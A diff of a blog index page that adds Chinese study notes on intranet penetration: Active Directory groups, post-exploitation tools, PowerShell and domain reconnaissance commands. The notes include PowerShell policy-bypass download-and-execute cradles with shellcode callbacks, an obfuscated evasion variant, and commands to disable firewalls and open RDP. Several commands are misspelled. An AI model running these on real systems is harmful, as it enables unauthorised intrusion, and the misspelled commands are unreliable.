@@ -139,19 +139,395 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-2019-HW行动总结" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-内网渗透/内网渗透学习笔记-基础及信息收集" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2020/02/07/2019-HW%E8%A1%8C%E5%8A%A8%E6%80%BB%E7%BB%93/">2019-HW行动总结</a>
+      <a class="article-title" href="/2020/02/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%9F%BA%E7%A1%80%E5%8F%8A%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">内网渗透/内网渗透学习笔记-基础及信息收集</a>
     </h1>
   
 
         
-        <a href="/2020/02/07/2019-HW%E8%A1%8C%E5%8A%A8%E6%80%BB%E7%BB%93/" class="archive-article-date">
+        <a href="/2020/02/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%9F%BA%E7%A1%80%E5%8F%8A%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="archive-article-date">
+  	<time datetime="2020-02-17T16:55:40.670Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-18</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h4><ul>
+<li>工作组：“计算机”属性中设置，“网络”中查看</li>
+<li>域：安全边界，一个域用户不能访问另一个域资源</li>
+<li>域控：管理服务器，负责域的身份校验、管理</li>
+<li>域名服务器：一般为域控服务器，负责域中服务器IP和域名转换</li>
+<li>成员服务器：打印机、防火墙、邮件服务器等</li>
+<li>客户机：域内一般服务器及PC</li>
+</ul>
+<ul>
+<li>域本地组：多域用户访问单域资源，用于赋予其他域用户、域用户组访问本域资源的访问权限</li>
+<li>全局组：单域用户访问多域资源，可赋予访问域林内其他域资源的权限</li>
+<li>通用组：可赋予访问域林内任意资源的权限，保存在GC（全局编录）中</li>
+<li>A（账户）-G（全局组）-DL（域本地组）-P（权限）策略：账户添加至全局组，将其他域全局组添加到本域本地组，为本地组赋予权限，U：通用组</li>
+</ul>
+<ul>
+<li>单域</li>
+<li>父子域</li>
+<li>域树（一父多子）</li>
+<li>域林（多父多子）</li>
+</ul>
+<h6 id="活动目录AD"><a href="#活动目录AD" class="headerlink" title="活动目录AD"></a>活动目录AD</h6><p>存储域内结构，提供域内资源的索引</p>
+<ul>
+<li><p>账号集中管理，统一部署密码规则、过期时间等</p>
+</li>
+<li><p>软件集中管理（批量分发软件-统一部署杀毒软件和杀毒任务，基本被edr取代）</p>
+</li>
+<li><p>环境集中管理（桌面、ie、tcp/ip设置等）</p>
+</li>
+<li><p>Exchange邮件依赖域环境</p>
+</li>
+<li><p>AD安装在DC上</p>
+</li>
+<li><p>AD</p>
+<ul>
+<li>Builtin：存放内置域本地组<ul>
+<li>管理员组（Administrators）：域内最高权限</li>
+<li>远程登录组（Remote Desktop Users）：远程登录权限</li>
+<li>打印机操作员组（Print Operators）：管理打印机，可在本地登录和关闭DC</li>
+<li>账号操作员组（Account Operators）：默认无成员，可创建用户和组，可登录域            控，不可更改Administrators和Domain Admins组的账户</li>
+<li>服务器操作员组：管理域服务器。默认无成员。增删改查服务器共享目录、关闭域            控，备份服务器文件，格式化服务器</li>
+<li>备份操作员组：在域控中执行备份和还原，可在本地登录和关闭域控，默认无成员</li>
+</ul>
+</li>
+<li>User ：存放内置全局组、通用组<ul>
+<li>域管理员组（Domain Admins）：会被加入Administrator组</li>
+<li>企业系统管理员组（Enterprise Admins）：域林跟域中一个组，在域林的每个域中            都是Administrators组成员 </li>
+<li>架构管理员组（Schema Admins）：域林跟域中一个组，可修改AD和域森林的模            式，是为AD和DC提供完整权限的域用户组</li>
+<li>域用户组（Domain Users）：包含所有域成员</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>内网划分：外网-&gt;DMZ-&gt;内网</p>
+</li>
+<li><p>内网渗透优先摸运维、开发、领导的主机</p>
+<h5 id="内网渗透工具"><a href="#内网渗透工具" class="headerlink" title="内网渗透工具"></a>内网渗透工具</h5></li>
+<li><p>wce：可列出登录会话、增删改查凭据（包括LM Hash、NTLM、Hash、明文密码、                Kerberos）</p>
+</li>
+<li><p>mimikatz：读取内存中明文密码，黄金票据、秘钥</p>
+</li>
+<li><p>DSHashes：从NTDSXtract中提取用户易于理解的散列值</p>
+</li>
+<li><p>PowerSploit：后渗透框架，可进行信息收集、提权、权限维持</p>
+</li>
+<li><p>Nishang：Powershell后渗透框架，集成了执行和下载脚本，记录键盘等等</p>
+</li>
+<li><p>Empire：内网渗透框架</p>
+</li>
+<li><p>ps_encoder.py：使用base64封装的Powershell命令包</p>
+</li>
+<li><p>smbexec：使用Samba工具快速PsExec的工具</p>
+<ul>
+<li>PsExec：通过ipc$连接，将psexesvc.exe释放到受害者上，然后通过SCManager远程创          建psexecsvc服务并启动服务，等待攻击机连接执行命令并回显，system权限</li>
+</ul>
+</li>
+<li><p>veil：加密msf payload</p>
+</li>
+<li><p>Cobalt Strike：内网渗透神器</p>
+</li>
+</ul>
+<h5 id="Powershell-基础："><a href="#Powershell-基础：" class="headerlink" title="Powershell 基础："></a>Powershell 基础：</h5><p>版本</p>
+<ul>
+<li>server 08/win7：2.0</li>
+<li>server 12/win8：3.0</li>
+<li>win 8.1+/server12 R2+：4.0  </li>
+</ul>
+<p>Get-ExecutionPolicy：查看脚本执行权限</p>
+<ul>
+<li>Unrestricted：允许所有脚本执行</li>
+<li>Restricted：不允许所有脚本执行（默认）</li>
+<li>RemoteSigned：允许本地脚本执行</li>
+<li>AllSigned：脚本签名被信任才可执行</li>
+<li>新建目录：New-Item xxx -ItemType Directory</li>
+<li>新建文件：New-Item xxx -ItemType File</li>
+<li>删除目录：Remove-Item xxx</li>
+<li>显示文本内容：Get-Content xxx</li>
+<li>设置文本内容：Set-Content xxx -Value “xxx”</li>
+<li>追加内容：Add-Content xxx -Value “xxx”</li>
+<li>清除内容：Clear-Content xxx</li>
+</ul>
+<ul>
+<li>绕过本地权限并执行：<ul>
+<li>powershell.exe -ExercutionPolicy Bypass -File xxx</li>
+<li>powershell.exe -exec bypass -Command “&amp; {Import-Module xxx;Invoke-AllChecks}”</li>
+</ul>
+</li>
+<li>从网站服务器下载脚本并执行：<ul>
+<li><code>powershell.exe -ExercutionPolicy Bypass（绕过策略） -WindowStyle Hidden（隐藏        窗口） -Noprofile（Powershell控制台不加载当前用户的配置文件）  -NonI（非交互模        式） IEX(New-ObjectNet.WebClient).DownloadString(&quot;链接&quot;);Invoke-Shellcode             Payload xxx -Lhost ip -Lport port</code></li>
+<li>-noexit 执行后不退出shell</li>
+<li>-NoLogo 启动不显示版权标志的Powershell </li>
+</ul>
+</li>
+<li>base64加密：ps_encoder.py -s xxx</li>
+<li>32位和64位的Powershell策略互不关联<ul>
+<li>64位：%Windir%\syswow64\windowspowershell\v1.0\powershell.exe -NoP -NonI -        w Hidden -Exec Bypass</li>
+</ul>
+</li>
+</ul>
+<p>powershell 免杀：</p>
+<ul>
+<li>set xx =oa &amp;&amp;echo IEX{New-Object Net.WebClient.Dowbl%xx%dString(“链接”)}|powershell -exeCu BYpasS -<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><h5 id="查询本机信息"><a href="#查询本机信息" class="headerlink" title="查询本机信息"></a>查询本机信息</h5></li>
+<li>ipconfig /all 查看ip设置及主机DNS设置</li>
+<li>arp -a 查看ARP缓存表</li>
+<li>route print 查看路由表</li>
+<li>systeminfo |findstr /B /C: “OS Name（名称）”  /C: “OS Version（版本）” 查询操作系统和    版本信息</li>
+<li>echo  %PROCESSOR_ARCHITECTURE% 查看系统体系架构</li>
+<li>wmic product get name，version 查看安装的软件及版本、路径等</li>
+<li>powershell “Get-WmiObject -class Win32_Product|Select-Object -Property name version”         同上</li>
+<li>wmic service list brief 查询本机服务信息</li>
+<li>tasklist 进程列表</li>
+<li>wmic product list brief 查看进程信息</li>
+<li>wmic startup get commamd，caption 查看启动程序信息</li>
+<li>schtasks /query /fo LIST /v 查看计划任务</li>
+<li>net statistics workstation 查看主机开机时间</li>
+<li>net user 查询用户列表</li>
+<li>net localgroup administrators 获得管理员信息</li>
+<li>query user || qwinsta 查看当前在线用户</li>
+<li>net session 列出或断开本地计算机和所连客户端之间的对话</li>
+<li>netstat -ano 查看端口列表</li>
+<li>systeminfo 查看补丁列表</li>
+<li>wmic qfe get Caption,Description,HotFixID,InstalledOn 查看补丁列表</li>
+<li>net share 查看本机共享列表</li>
+<li>wmic share get name，path，status 查看本机共享列表</li>
+<li>关闭防火墙<ul>
+<li>03-：netsh firewall set opmode disable</li>
+<li>03+：netsh advfirewall set allprofiles state off</li>
+</ul>
+</li>
+<li>netsh firewall show config 查看防火墙配置</li>
+<li>修改防火墙配置<ul>
+<li>03-：netsh firewall add allowedprogram c:\nc.exe “allow nc” enable 允许指定程序全部链接</li>
+<li>03+：net advfirewall add rule name=”pass nc” dir=in action=allow program=”C:/nc.exe” 允许指定程序进入</li>
+<li>net advfirewall add rule name=”Allow nc” dir=off action=allow program=”C:/nc.exe” 允许指定程序退出</li>
+<li>net advfirewall add rule name=“RDP” protocol=TCP dir=in loaclport=3389 action=allow 允许3389端口放行</li>
+<li>netsh advfirewall set currnetprofile logging filename “C:\windows\temp\fw.log”自定义防火墙存储的位置</li>
+</ul>
+</li>
+<li>reg query “HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrnetVersion\Internet Setting”查看代理配置情况</li>
+<li>reg query “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp” /V PortNumber 查看远程连接端口</li>
+<li>开启3389端口<ul>
+<li>03：<code>wmic path win32_terminalservicesetting where (__CLASS != “”) call setallowtsconnections 1</code></li>
+<li>03+:<ul>
+<li><code>wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != “”) call setallowtsconnections 1</code></li>
+<li><code>wmic /namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName =’RDP-Tcp’) call setuserauthenticationrequired 1</code></li>
+<li><code>reg add “HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>usermodule situational_awareness/host/winenum Empire进行信息收集</li>
+<li>whoami 当前权限</li>
+<li>whoami /all 获取域SID</li>
+<li>net user xxx /domain 查看用户详细信息</li>
+<li>nslookup 域名 ：查看dc与域dns服务器是否为同一服务器</li>
+<li>net config workstation 查询当前登陆域及登录用户信息</li>
+<li>net time /domain 判断主域<h5 id="扫描域内存活主机"><a href="#扫描域内存活主机" class="headerlink" title="扫描域内存活主机"></a>扫描域内存活主机</h5></li>
+<li>nbt.exe 内网网段：nbtscan扫描内网网段</li>
+<li>for /L %I in (1,1,254) DO @ping -w 1 -n xxx.xxx.xxx.%I |findstr “TTL” ：ICMP快速探测内网</li>
+<li>arp-scan -t xxx.xxx.xxx.xxx/xx arp-scan探测内网</li>
+<li>usermodule situational_awareness/network/arpscan Empire中的arpscan模块</li>
+<li>powershell -exec bypass -Command “{Import-Module xxx;Invoke-APRScan -CIDR ip段}” &gt;&gt; xxx.txt Nishang中的arpscan脚本</li>
+<li>scanline -h -t port -u port -O 输出文件 -p ip段 scanline扫描内网ip端口<h5 id="扫描域内端口"><a href="#扫描域内端口" class="headerlink" title="扫描域内端口"></a>扫描域内端口</h5></li>
+<li>telnet</li>
+<li>s扫描器</li>
+<li>msf：use auxiliary/scanner/portscan/tcp</li>
+<li>PowerSploit：<ul>
+<li><code>powershell.exe -nop -exec bypass -c &quot;{New-Object Net.WebClient}.DownLoading(&quot;链接&quot;);Invoke-Portscan -Host ip段 -T 4 -ports &#39;443,xxxx,&#39; -oA xxx.txt&#39;&quot;</code></li>
+</ul>
+</li>
+<li>Nishang:<ul>
+<li><code>Invoke-PortScan -StartAddress ip -EndAddress ip -ResolveHost</code><h5 id="收集域内信息"><a href="#收集域内信息" class="headerlink" title="收集域内信息"></a>收集域内信息</h5></li>
+</ul>
+</li>
+<li>net view /domain 查询域</li>
+<li>net view/domain:xxx 查询域内某台计算机</li>
+<li>net group /domain 查询域内用户组</li>
+<li>net group “domain computers” /domain 查询域内pc</li>
+<li>net account /domain 查询域内密码策略</li>
+<li>nltest /domain_trusts:获取域信任信息<h5 id="查找域控"><a href="#查找域控" class="headerlink" title="查找域控"></a>查找域控</h5></li>
+<li>nltest /DCLIST:域名 查看DC机器名</li>
+<li>Nslookup -type=SRV_ldap._tcp 查看域控主机名</li>
+<li>net group “Domain Controllers” /domain 查看域控组</li>
+<li>netdom query pdc查看DC机器名<h5 id="查看域用户信息"><a href="#查看域用户信息" class="headerlink" title="查看域用户信息"></a>查看域用户信息</h5></li>
+<li>net user /domain</li>
+<li>wmic useraccount get /all</li>
+<li>dsquery user 查看存在的用户</li>
+<li>net group administrator 查看本地管理员组用户</li>
+<li>net group “domain admins” /domain 查看域管用户</li>
+<li>net group “Enterpise Admins” /domain 查询域管用户组<h5 id="定位域管理员"><a href="#定位域管理员" class="headerlink" title="定位域管理员"></a>定位域管理员</h5></li>
+<li>psloggedon.exe</li>
+<li>PVEFindUser.exe –current</li>
+<li>netview.exe</li>
+<li>Nmap NSE:<ul>
+<li>smb-enum-session.nse</li>
+<li>smb-enum-domain.nse</li>
+<li>smb-enum-share.nse</li>
+<li>smb-enum-processes.nse</li>
+<li>smb-enum-discovery.nse</li>
+</ul>
+</li>
+<li>PowerView脚本</li>
+<li>Empire的usermodule situational_awareness/network/powerview/user_hunter模块<h5 id="查看域管进程"><a href="#查看域管进程" class="headerlink" title="查看域管进程"></a>查看域管进程</h5></li>
+<li>tasklist /v</li>
+<li>NetSess -h 返回活动会话的ip、域账户、开始时间、空闲时间</li>
+<li>Get Domian Admins脚本<h5 id="模拟域管理员"><a href="#模拟域管理员" class="headerlink" title="模拟域管理员"></a>模拟域管理员</h5></li>
+<li>在有meterpreter会话情况下可使用Incognito模拟域管理员，遍历系统中所有授权令牌来添加新管理员<h5 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h5></li>
+<li>Get-NetDomain：</li>
+<li>Get-NetUser</li>
+<li>Get-NetDomainController</li>
+<li>Get-NetComputer</li>
+<li>Get-NetOU：获取域内OU信息</li>
+<li>Get-NetGroup</li>
+<li>Get-NetShare</li>
+<li>Get-NetSession</li>
+<li>Get-NetRDPSession</li>
+<li>Get-NetProcess</li>
+<li>Get-NetFileServer：根据SPN获取当前域使用的文件服务器信息</li>
+<li>Get-UserEvent：获取用户日志</li>
+<li>Get-ADObejct：获取活动目录对象</li>
+<li>Get-NetGPO：获取域内组策略对象</li>
+<li>Get-DomainPolicy：获取域默认策略或域控制器策略</li>
+<li>Invoke-UserHunter：获取域用户登录的pc信息及该账户是否具有管理员权限</li>
+<li>Invoke-ProcessHunter：获取域内所有机器进程查找特定账户</li>
+<li>Invoke-UserEventHunter：根据日志查询某用户登陆过哪些域机器<h5 id="内网渗透流程"><a href="#内网渗透流程" class="headerlink" title="内网渗透流程"></a>内网渗透流程</h5></li>
+<li>跳板机普通权限-&gt;管理员权限-&gt;横向跳转至查找到域管进程-&gt;获取凭据-&gt;提升为域管权限</li>
+</ul>
+<h5 id="BloodHound："><a href="#BloodHound：" class="headerlink" title="BloodHound："></a>BloodHound：</h5><p>sh.exe -c all 收集域内信息</p>
+<h5 id="敏感信息"><a href="#敏感信息" class="headerlink" title="敏感信息"></a>敏感信息</h5><ul>
+<li>人事架构-&gt;敏感目标人物-&gt;个人pc-&gt;文件位置</li>
+<li>备份文件、后台、未过期cookies、浏览器历史记录、其他用户会话连接记录、回收站、docx、excel、配置文件、内存中的vpn或其他远程管理工具的密码</li>
+</ul>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/02/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%9F%BA%E7%A1%80%E5%8F%8A%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" target="_blank" rel="noopener" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-渗透测试/信息收集组件" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%BB%84%E4%BB%B6/">渗透测试/信息收集组件</a>
+    </h1>
+  
+
+        
+        <a href="/2020/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%BB%84%E4%BB%B6/" class="archive-article-date">
+  	<time datetime="2020-02-07T13:41:30.380Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-07</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>1.</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%BB%84%E4%BB%B6/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" target="_blank" rel="noopener" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-HW行动/2019-HW行动总结" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/02/07/HW%E8%A1%8C%E5%8A%A8/2019-HW%E8%A1%8C%E5%8A%A8%E6%80%BB%E7%BB%93/">HW行动/2019-HW行动总结</a>
+    </h1>
+  
+
+        
+        <a href="/2020/02/07/HW%E8%A1%8C%E5%8A%A8/2019-HW%E8%A1%8C%E5%8A%A8%E6%80%BB%E7%BB%93/" class="archive-article-date">
   	<time datetime="2020-02-07T12:37:33.919Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-07</time>
 </a>
         
@@ -202,7 +578,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2020/02/07/2019-HW%E8%A1%8C%E5%8A%A8%E6%80%BB%E7%BB%93/">展开全文 >></a>
+          <a class="article-more-a" href="/2020/02/07/HW%E8%A1%8C%E5%8A%A8/2019-HW%E8%A1%8C%E5%8A%A8%E6%80%BB%E7%BB%93/">展开全文 >></a>
         </p>
       
 
